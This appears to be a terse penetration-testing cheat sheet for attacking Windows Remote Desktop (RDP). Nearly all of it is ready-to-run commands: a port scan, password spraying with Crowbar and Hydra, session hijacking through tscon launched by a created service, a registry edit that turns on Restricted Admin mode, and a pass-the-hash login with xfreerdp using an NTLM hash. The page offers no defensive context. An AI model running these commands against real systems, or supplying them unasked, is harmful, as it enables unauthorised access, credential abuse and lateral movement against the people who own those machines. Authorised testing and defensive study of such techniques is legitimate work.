- RDP uses port `TCP/3389`
# ENUMERATION
```shell
nmap -Pn -p3389 192.168.2.143 
```
# Misconfigurations
- Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing.
### Crowbar
```shell
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
### Hydra
```shell
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
### RDP Login
```shell
rdesktop -u admin -p password123 192.168.2.143
```
### RDP Session Hijacking
```cmd
tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

```cmd
query user
```

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

```cmd
net start sessionhijack
```
## RDP Pass-the-Hash (PtH)
If `Restricted Admin Mode`
#### Add the DisableRestrictedAdmin Registry Key
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```shell
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```
